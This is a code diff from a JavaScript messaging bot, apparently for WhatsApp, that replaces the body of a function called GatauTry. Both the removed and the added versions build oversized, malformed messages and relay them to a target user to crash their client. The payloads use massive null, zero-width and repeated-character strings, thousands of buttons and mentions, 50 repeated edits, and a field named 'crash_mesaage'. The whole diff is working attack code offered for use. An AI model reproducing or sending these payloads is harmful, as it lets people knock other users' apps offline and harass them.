@@ -1357,141 +1357,37 @@ async function initializeBot() {
 }
 
 async function GatauTry(sock, target) {
-    try {
-        const r = (c, n) => c.repeat(n);
-        const rnd = (n) => Math.random().toString(36).repeat(n).substring(0, n);
-        const gid = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase() + Date.now().toString(36).toUpperCase();
-
-        const build = (seed = 0) => {
-            const rid = [8,4,4,4,12].map(n => Math.random().toString(36).substring(2, 2+n)).join('-');
-            return {
-                messageContextInfo: {
-                    deviceListMetadata: {},
-                    deviceListMetadataVersion: 2,
-                    messageSecret: Buffer.alloc(32, seed % 255).toString('base64'),
-                    botMetadata: {
-                        messageDisclaimerText: r("\u0000", 50000),
-                        botResponseId: rid,
-                        imagineMetadata: {
-                            imagineType: 1,
-                            shortPrompt: "@VinxzGanteng" + r("\n", 25000),
-                            prompt: rnd(50000)
-                        }
-                    }
+  const msg = {
+    groupMentionedMessage: {
+      message: {
+        ephemeralMessage: {
+          message: {
+            liveLocationMessage: {
+              message: {
+                interactiveMessage: {
+                  body: {
+                    text: "⭑‌By Nexvøid! ༑"
+                  },
+                  nativeFlowMessage: {
+                    extra: "\u31040",
+                    buttons: "A".repeat(20000),
+                    extra1: "A".repeat(5555),
+                    name: "crash_mesaage"
+                  },
+                  buttons: "A".repeat(4)
                 },
-                botForwardedMessage: {
-                    message: {
-                        richResponseMessage: {
-                            messageType: 1,
-                            response_id: rid,
-                            submessages: [
-                                { messageType: 2, messageText: "Hellow" + r("\n", 50000) },
-                                { messageType: 2, messageText: rnd(50000) },
-                                { messageType: 2, messageText: r("\u200b", 50000) }
-                            ],
-                            unifiedResponse: {
-                                data: Buffer.from(JSON.stringify({
-                                    __typename: 'XMSGGenAIUnifiedResponse',
-                                    response_id: rid,
-                                    sections: Array.from({ length: 30 }, () => ({
-                                        __typename: 'GenAIUnifiedResponseSection',
-                                        view_model: {
-                                            __typename: 'GenAISingleLayoutViewModel',
-                                            primitive: {
-                                                __typename: 'GenAIaeacdsnwHtmlPrimitive',
-                                                payload: r("\u0000", 250000) + r("\uffff", 250000),
-                                                trusted_sources: []
-                                            }
-                                        }
-                                    }))
-                                })).toString('base64')
-                            },
-                            richResponse: {
-                                responseType: "TEXT",
-                                text: r("\u0000", 250000) + r("\x10", 250000) + r("\uffff", 250000) + r("\u200b", 250000),
-                                title: r("\u200b", 250000) + r("\n", 250000),
-                                subtitle: "AtX - By @VinxzGanteng" + r("\n", 100000),
-                                footer: r("\u0000", 100000),
-                                buttons: Array.from({ length: 8000 }, (_, i) => ({
-                                    name: ["quick_reply", "cta_url", "single_select", "call_permission_request"][i % 4],
-                                    buttonParamsJson: JSON.stringify({
-                                        display_text: r("\n", 25000) + r("\u200b", 25000),
-                                        id: "AtX_" + rnd(100) + "_" + i,
-                                        url: "https://chat.whatsapp.com/" + rnd(22),
-                                        native_flow_name: "review_and_pay",
-                                        currency: "IDR",
-                                        value: "0",
-                                        reference_id: rnd(100)
-                                    })
-                                })),
-                                messageParamsJson: "[".repeat(100000) + "null".repeat(100000) + "]".repeat(100000)
-                            },
-                            contextInfo: {
-                                forwardingScore: 2147483647,
-                                isForwarded: true,
-                                forwardOrigin: 4,
-                                expiration: 0,
-                                ephemeralSettingTimestamp: Date.now(),
-                                disappearingMode: { initiator: 0, trigger: 1 },
-                                afterReadDuration: 1,
-                                forwardedAIBotMessageInfo: {
-                                    botName: r("\u0000", 100000) + r("\x10", 100000),
-                                    botJid: [
-                                        "13135550002@s.whatsapp.net",
-                                        "0@s.whatsapp.net",
-                                        ...Array.from({ length: 8000 }, () => Math.random().toString(36).repeat(50) + "@s.whatsapp.net")
-                                    ],
-                                    creatorName: r("\u200b", 100000) + r("\uffff", 100000)
-                                },
-                                mentionedJid: [
-                                    target,
-                                    ...Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net")
-                                ],
-                                quotedMessage: {
-                                    richResponseMessage: {
-                                        message: { text: r("A", 250000) },
-                                        richResponse: {
-                                            responseType: "TEXT",
-                                            text: r("\u0000", 250000),
-                                            messageParamsJson: "[".repeat(100000)
-                                        }
-                                    }
-                                },
-                                aiProvenance: {
-                                    c2PaMetadata: { createdWithGenAi: true, editedWithGenAi: true },
-                                    iptcMetadata: { createdWithGenAi: true, editedWithGenAi: true }
-                                }
-                            }
-                        }
-                    }
-                }
-            };
-        };
-
-        const edit = (id, seed) => ({
-            botForwardedMessage: {
-                message: {
-                    protocolMessage: {
-                        key: { remoteJid: target, fromMe: true, id },
-                        type: 14,
-                        timestampMs: Date.now(),
-                        editedMessage: build(seed)
-                    }
-                }
+                buttons: "A".repeat(555)
+              }
             }
-        });
-
-        const mainId = gid();
-        await sock.relayMessage(target, build(0), { messageId: mainId, participant: { jid: target } });
-
-        for (let i = 0; i < 50; i++) {
-            await sock.relayMessage(target, edit(mainId, i + 1), { messageId: gid(), participant: { jid: target } });
+          }
         }
-
-        return { success: true, target, messageId: mainId };
-    } catch (e) {
-        return { success: false, error: e.message };
+      }
     }
+  };
+
+  await sock.relayMessage(target, msg, {
+    messageId: sock.generateMessageTag()
+  });
 }
 
 async function anjay(sock, target) {
